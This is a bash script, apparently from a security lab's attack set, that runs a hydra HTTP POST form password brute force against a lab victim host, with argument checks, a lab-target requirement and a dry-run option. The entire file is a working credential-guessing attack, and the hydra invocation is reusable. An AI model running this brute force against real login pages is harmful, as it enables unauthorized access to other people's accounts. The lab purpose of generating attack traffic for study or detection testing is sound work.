#!/usr/bin/env bash
# HTTP form brute force (hydra http-post-form) against the lab victim. Attacker host only.
#   bash lab/attacks/hydra_http.sh --target <victim-ip> --pi-ip IP --victim-net CIDR --protected-net CIDR \
#        --wordlist FILE [--user admin] [--tasks 4] [--port 80] [--duration 60] [--dry-run]
source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"
parse_common "$@"
USER_NAME=admin
TASKS=4
PORT=80
WORDLIST=""
set -- "${REST[@]}"
while (($#)); do
  case "$1" in
    --user) USER_NAME="${2:?}"; shift ;;
    --tasks) TASKS="${2:?}"; shift ;;
    --port) PORT="${2:?}"; shift ;;
    --wordlist) WORDLIST="${2:?}"; shift ;;
    *) no_extra_args "$@" ;;
  esac
  shift
done
require_lab_target
require_number "$TASKS" "--tasks"
require_number "$PORT" "--port"
[[ "$USER_NAME" =~ ^[A-Za-z0-9_.-]{1,32}$ ]] || refuse "--user $USER_NAME is not a plain user name"
[[ -n "$WORDLIST" ]] || refuse "--wordlist FILE is required"
(( DRY_RUN )) || [[ -r "$WORDLIST" ]] || refuse "--wordlist $WORDLIST is not readable"
tool_version hydra
run_attack hydra -I -t "$TASKS" -s "$PORT" -l "$USER_NAME" -P "$WORDLIST" "$DEST" \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=denied"
